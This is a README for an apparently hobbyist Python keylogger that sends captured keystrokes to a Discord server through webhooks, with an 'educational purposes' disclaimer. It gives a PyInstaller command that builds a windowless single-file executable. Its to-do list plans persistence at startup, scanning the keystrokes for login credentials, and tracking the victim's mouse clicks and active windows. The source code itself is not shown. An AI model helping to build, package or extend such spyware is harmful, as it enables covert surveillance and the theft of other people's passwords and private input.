# Key logger with Discord Webhooks

A simple keylogger written in Python with Discord Webhooks integration that sends data to a Discord server.

*This README is a work in progress.*


## This code DOES NOT promote or encourage any illegal activities! The content in this document is provided solely for educational purposes and to create awareness!



## For creating executable

```bash
pyinstaller --noconfirm --onefile --windowed --hidden-import "pynput" --hidden-import "requests" --hidden-import "dhooks" --hidden-import "os" --hidden-import "platform" --hidden-import "re" --hidden-import "socket" --hidden-import "uuid" --hidden-import "py-cpuinfo" --hidden-import "psutil" --hidden-import "cpuinfo" --hidden-import "get" --hidden-import "urllib3" --hidden-import "sys" --hidden-import "." --hidden-import "sessions" --hidden-import "warnings" --hidden-import ".exceptions" --hidden-import "RequestsDependencyWarning" --hidden-import ".compat" --hidden-import "builtin_str" --hidden-import "threading" --hidden-import "base64" --hidden-import "certifi" --hidden-import "io" --hidden-import "collections" --hidden-import "datetime" --hidden-import "aiohttp" --hidden-import "aiosignal" --hidden-import "async-timeout" --hidden-import "attrs" --hidden-import "charset-normalizer" --hidden-import "evdev" --hidden-import "frozenlist" --hidden-import "idna" --hidden-import "multidict" --hidden-import "python-xlib" --hidden-import "six" --hidden-import "yarl"  "main.py"
```


Pyinstaller is currently bugging and not including all the dependencies, for this reason they were manually added to the
command.
Following up on that, I haven't figured out how to add the modules required to get the `Host` CPU info and external IP
address.

I will be updating this README with more information as I go and append a StackOverflow question to this repo for the
aforementioned issue.

In the future I might look into [Nuitka](https://github.com/Nuitka/Nuitka) for compiling the project.



There are still other things to implement and improve, but this is a good start.



### Things I want to add:

* [ ] Figure out how to get the Host's CPU info and external IP address working on the pyinstaller build.
* [ ] Figure out how to launch the executable on startup after first run.
* [ ] Add some kind of diagram or chart export for most used words, letters.
* [ ] Scan for potential passwords, i.e. login credentials.
* [ ] Log mouse click events as well.
* [ ] Notification/Log when the client changes windows/applications.
* [ ] Expand and improve this README.